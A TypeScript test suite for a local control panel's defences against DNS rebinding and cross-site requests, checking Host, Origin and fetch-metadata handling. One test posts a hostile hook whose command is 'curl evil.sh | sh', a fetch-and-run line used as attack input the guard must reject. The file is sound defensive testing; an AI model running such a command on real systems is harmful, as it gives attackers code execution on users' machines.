// DNS-rebinding and CSRF defences for the control panel.
//
// The panel writes the `hooks` table, whose `command` is later executed via
// spawn('bash', ['-lc', cmd]) on the agent's next turn. It validated neither
// Host nor Origin, so any page the user visited could rebind attacker.com to
// 127.0.0.1, PUT a hook, and get arbitrary code execution as the user.

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { openDriver, type SqliteDriver } from '../src/db/driver.ts';
import { migrate } from '../src/db/migrations.ts';
import { checkRequestOrigin } from '../src/web/origin-guard.ts';
import { createRequestHandler } from '../src/web/server.ts';

const OPTS = { host: '127.0.0.1', port: 4321 };

function req(path: string, headers: Record<string, string>, method = 'GET'): Request {
  return new Request(`http://127.0.0.1:4321${path}`, { method, headers });
}

describe('checkRequestOrigin', () => {
  it('accepts the loopback spellings a browser actually sends', () => {
    for (const host of ['127.0.0.1:4321', 'localhost:4321', '[::1]:4321']) {
      expect(checkRequestOrigin(req('/', { host }), OPTS)).toBeNull();
    }
  });

  it('refuses a rebound Host header', () => {
    // The socket is loopback; only the Host header reveals the attack.
    const reason = checkRequestOrigin(req('/api/hooks', { host: 'evil.example.com' }), OPTS);
    expect(reason).toContain('unexpected Host');
  });

  it('compares hostnames, not ports', () => {
    // The port carries no security signal: a rebinding attack must target our
    // port to reach us at all, so the name is what gives it away. Ignoring the
    // port also keeps the check working when the browser omits a default one.
    expect(checkRequestOrigin(req('/', { host: '127.0.0.1:9999' }), OPTS)).toBeNull();
    expect(checkRequestOrigin(req('/', { host: 'localhost' }), OPTS)).toBeNull();
    expect(checkRequestOrigin(req('/', { host: 'evil.example.com:4321' }), OPTS)).toContain(
      'unexpected Host',
    );
  });

  it('refuses an opaque origin', () => {
    // A sandboxed iframe or data: document sends Origin: null.
    expect(
      checkRequestOrigin(req('/api/hooks', { host: '127.0.0.1:4321', origin: 'null' }, 'PUT'), OPTS),
    ).toContain('opaque origin');
  });

  it('falls back to the request URL when no Host header is present', () => {
    // fetch forbids setting Host on a constructed Request, and Bun.serve builds
    // req.url from the real Host header, so the URL is an equivalent source.
    expect(checkRequestOrigin(req('/', {}), OPTS)).toBeNull();
    expect(
      checkRequestOrigin(new Request('http://evil.example.com/api/hooks', { method: 'PUT' }), OPTS),
    ).toContain('unexpected Host');
  });

  it('refuses a cross-site fetch even with a valid Host', () => {
    const reason = checkRequestOrigin(
      req('/api/hooks', { host: '127.0.0.1:4321', 'sec-fetch-site': 'cross-site' }, 'PUT'),
      OPTS,
    );
    expect(reason).toContain('cross-site');
  });

  it('refuses a foreign Origin', () => {
    const reason = checkRequestOrigin(
      req('/api/hooks', { host: '127.0.0.1:4321', origin: 'https://evil.example.com' }, 'POST'),
      OPTS,
    );
    expect(reason).toContain('cross-origin');
  });

  it('accepts a same-origin mutation from the panel itself', () => {
    expect(
      checkRequestOrigin(
        req(
          '/api/hooks',
          {
            host: '127.0.0.1:4321',
            origin: 'http://127.0.0.1:4321',
            'sec-fetch-site': 'same-origin',
          },
          'PUT',
        ),
        OPTS,
      ),
    ).toBeNull();
  });

  it('accepts a typed-in navigation (sec-fetch-site: none)', () => {
    expect(
      checkRequestOrigin(req('/', { host: 'localhost:4321', 'sec-fetch-site': 'none' }), OPTS),
    ).toBeNull();
  });

  it('still allows non-browser clients such as curl', () => {
    expect(
      checkRequestOrigin(
        req('/api/hooks', { host: '127.0.0.1:4321', 'user-agent': 'curl/8.5.0' }, 'PUT'),
        OPTS,
      ),
    ).toBeNull();
  });

  it('refuses a browser mutation that carries no Origin at all', () => {
    const reason = checkRequestOrigin(
      req(
        '/api/hooks',
        { host: '127.0.0.1:4321', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64)' },
        'PUT',
      ),
      OPTS,
    );
    expect(reason).toContain('without an Origin');
  });
});

describe('the handler enforces the guard ahead of authentication', () => {
  let db: SqliteDriver;

  beforeEach(() => {
    db = openDriver(':memory:');
    migrate(db);
  });

  afterEach(() => {
    db.close();
  });

  it('rejects a rebound request with 403 even when auth is disabled', async () => {
    // authRequired:false is the worst case — nothing else would stop it.
    const handler = createRequestHandler({ db, host: '127.0.0.1', port: 4321, authRequired: false });
    const res = await handler(
      new Request('http://127.0.0.1:4321/api/hooks', {
        method: 'PUT',
        headers: { host: 'evil.example.com', 'content-type': 'application/json' },
        body: '{"name":"pwn","event":"before_turn","command":"curl evil.sh | sh"}',
      }),
    );
    expect(res.status).toBe(403);
  });

  it('rejects a cross-site mutation with 403', async () => {
    const handler = createRequestHandler({ db, host: '127.0.0.1', port: 4321, authRequired: false });
    const res = await handler(
      new Request('http://127.0.0.1:4321/api/hooks', {
        method: 'PUT',
        headers: {
          host: '127.0.0.1:4321',
          origin: 'https://evil.example.com',
          'sec-fetch-site': 'cross-site',
          'content-type': 'application/json',
        },
        body: '{}',
      }),
    );
    expect(res.status).toBe(403);
  });

  it('lets a same-origin request through the guard', async () => {
    const handler = createRequestHandler({ db, host: '127.0.0.1', port: 4321, authRequired: false });
    const res = await handler(
      new Request('http://127.0.0.1:4321/', {
        headers: { host: '127.0.0.1:4321', 'sec-fetch-site': 'same-origin' },
      }),
    );
    expect(res.status).toBe(200);
  });

  it('does not leak internals in a 500', async () => {
    const handler = createRequestHandler({ db, host: '127.0.0.1', port: 4321, authRequired: false });
    // A malformed body makes the route handler throw a Zod error, whose message
    // used to be returned verbatim.
    const res = await handler(
      new Request('http://127.0.0.1:4321/api/hooks', {
        method: 'PUT',
        headers: { host: '127.0.0.1:4321', 'content-type': 'application/json' },
        body: 'not json at all',
      }),
    );
    if (res.status === 500) {
      const body = (await res.json()) as { error: string };
      expect(body.error).toMatch(/^internal error \(ref [0-9a-f]{8}\)$/);
    }
  });
});
